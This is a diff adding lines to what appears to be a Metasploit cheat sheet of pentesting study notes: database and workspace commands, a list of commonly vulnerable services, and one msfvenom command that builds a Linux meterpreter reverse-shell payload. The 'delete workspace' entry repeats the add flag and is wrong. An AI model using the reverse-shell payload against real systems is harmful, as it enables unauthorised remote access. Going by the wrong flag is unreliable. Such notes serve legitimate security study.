@@ -160,6 +160,43 @@ An exploitation framework. Has commercial GUI version **Metasploit Pro** and FOS
 
 `sessions -i [number]` - interact with session
 
+#### Setting up database connection and workspace
+
+`systemctl start postgresql` - start postgresql database
+
+`sudo -u postgres msfdb init` - initialize msf database. Needs to be run as non-root user, e.g. postgres.
+
+`sudo -u postgres msfdb delete` - delete msf database
+
+`workspace -a [name]` - add new workspace
+
+`workspace -a [name]` - delete workspace
+
+`db_nmap` - do nmap scan and save results to workspace db
+
+`help` - when msf db is active, help will show more commands like `db_nmap`
+
+`hosts` - show hosts in workspace. `-R` equals `setg RHOSTS [host IPs in db]` `-h` for help
+
+`services` - show services in workspace. `-S [keyword]` for search. `-h` for help
+
+#### Creating custom payloads with msfvenom
+
+`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=XXXX -f elf > rev_shell.elf` - create payload for Linux
+
+### Low hanging fruits
+
+**HTTP**: Could host a web application with vulns like
+SQL injection or RCE.
+
+**FTP**: Could allow anonymous login and provide access to files.
+
+**SMB**: Could be vulnerable to SMB exploits like MS17-010
+
+**SSH**: Could have default or easy to guess credentials
+
+**RDP**: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.
+
 ### Modules
 
 Modules are located in: `/opt/metasploit-framework/embedded/framework/modules`
